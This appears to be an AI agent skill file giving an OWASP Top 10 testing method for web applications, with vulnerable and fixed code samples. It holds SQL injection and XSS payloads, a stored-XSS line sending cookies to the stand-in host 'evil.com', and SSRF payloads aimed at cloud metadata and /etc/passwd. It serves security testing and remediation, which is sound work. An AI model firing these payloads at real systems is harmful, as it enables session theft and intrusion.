---
name: owasp-testing-guide
description: "OWASP Top 10-based security testing methodology, per-vulnerability attack vectors, detection methods, and fix guides. Use this skill for web application security testing, including 'OWASP', 'Top 10', 'XSS', 'SQL Injection', 'CSRF', 'SSRF', 'Injection', 'security testing methodology', 'vulnerability testing', and similar requests. It enhances the security analysis capabilities of code-analyst and pentest-reporter. However, actual penetration test execution and network scanning are out of scope for this skill."
---

# OWASP Testing Guide — OWASP Top 10 security testing guide

Per-vulnerability detection/testing/fixing methodology based on OWASP Top 10 (2021).

## OWASP Top 10 (2021) mapping

| Rank | Category | CWE example | Severity |
|------|---------|---------|--------|
| A01 | Broken Access Control | CWE-200, CWE-352 | Critical |
| A02 | Cryptographic Failures | CWE-259, CWE-327 | High |
| A03 | Injection | CWE-79, CWE-89 | Critical |
| A04 | Insecure Design | CWE-209, CWE-256 | High |
| A05 | Security Misconfiguration | CWE-16, CWE-611 | Medium~High |
| A06 | Vulnerable Components | CWE-1035 | High |
| A07 | Auth Failures | CWE-287, CWE-384 | Critical |
| A08 | Data Integrity Failures | CWE-502 | High |
| A09 | Logging Failures | CWE-778 | Medium |
| A10 | SSRF | CWE-918 | High |

## A01: Broken Access Control

### Test method
```
1. IDOR (Insecure Direct Object Reference)
   GET /api/users/123/profile → 200 (self)
   GET /api/users/456/profile → 200 (someone else) → vulnerable!

2. Privilege escalation
   Call an admin API with a regular user token:
   POST /api/admin/users (regular token) → should be 403

3. Horizontal privilege movement
   Modify user B's resource with user A's token:
   PUT /api/orders/B_ORDER_ID (A token) → should be 403
```

### Fix guide
```python
# Before (vulnerable)
@app.get("/api/users/{user_id}")
def get_user(user_id: int):
    return db.query(User).filter(User.id == user_id).first()

# After (fixed)
@app.get("/api/users/{user_id}")
def get_user(user_id: int, current_user: User = Depends(get_current_user)):
    if user_id != current_user.id and not current_user.is_admin:
        raise HTTPException(403)
    return db.query(User).filter(User.id == user_id).first()
```

## A03: Injection

### SQL Injection testing

```
Input payloads:
├── Basic: ' OR '1'='1
├── UNION: ' UNION SELECT username,password FROM users --
├── Time-based blind: ' AND SLEEP(5) --
├── Error-based: ' AND 1=CONVERT(int,(SELECT @@version)) --
└── Second-order injection: admin'--  (stored at signup, triggered at login)
```

### XSS (Cross-Site Scripting) testing

```
Reflected XSS:
  /search?q=<script>alert(1)</script>
  /search?q=<img src=x onerror=alert(1)>

Stored XSS:
  In a comment/review: <script>document.location='evil.com?c='+document.cookie</script>

DOM-based XSS:
  #<img src=x onerror=alert(1)> (fragment-based)
```

### Fix principles

| Vulnerability | Fix | Framework support |
|--------|------|---------------|
| SQL Injection | Parameterized queries | Use an ORM, no raw SQL |
| XSS | Output encoding | React JSX auto-escaping, DOMPurify |
| Command Injection | Whitelist validation | shell=False with subprocess |
| LDAP Injection | Parameter binding | Library built-in escaping |

## A07: Authentication Failures

### Test items

```
1. Brute-force protection
   10 failures on the same account → account lockout or exponential backoff?

2. Password policy
   "password" allowed? Minimum length? Complexity?

3. Session management
   Is the previous token valid after logout? (session invalidation)
   Is the token expiry time appropriate?

4. JWT verification
   Is the alg: none attack allowed?
   Secret key strength?
   Sensitive information in the token payload?

5. MFA bypass
   Can the MFA step be skipped?
   Can backup codes be brute-forced?
```

## A10: SSRF (Server-Side Request Forgery)

### Test payloads
```
Internal network access:
  url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
  url=http://localhost:6379/  (internal Redis)
  url=http://10.0.0.1/admin  (internal admin console)

Protocol variants:
  url=file:///etc/passwd
  url=gopher://127.0.0.1:25/
  url=dict://127.0.0.1:6379/info
```

### Fix
```python
# SSRF prevention: URL whitelist + internal IP blocking
BLOCKED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return False
    ip = socket.gethostbyname(parsed.hostname)
    for blocked in BLOCKED_RANGES:
        if ipaddress.ip_address(ip) in blocked:
            return False
    return True
```

## Security header checklist

| Header | Recommended value | Purpose |
|------|-------|------|
| Content-Security-Policy | script-src 'self' | XSS prevention |
| X-Content-Type-Options | nosniff | MIME sniffing prevention |
| X-Frame-Options | DENY | Clickjacking prevention |
| Strict-Transport-Security | max-age=31536000; includeSubDomains | Enforce HTTPS |
| X-XSS-Protection | 0 (when using CSP) | Legacy XSS filter |
| Referrer-Policy | strict-origin-when-cross-origin | Referrer leak prevention |

## CVSS severity levels

| Level | Score | Response deadline |
|------|------|----------|
| Critical | 9.0~10.0 | Within 24 hours |
| High | 7.0~8.9 | Within 1 week |
| Medium | 4.0~6.9 | Within 1 month |
| Low | 0.1~3.9 | Next release |
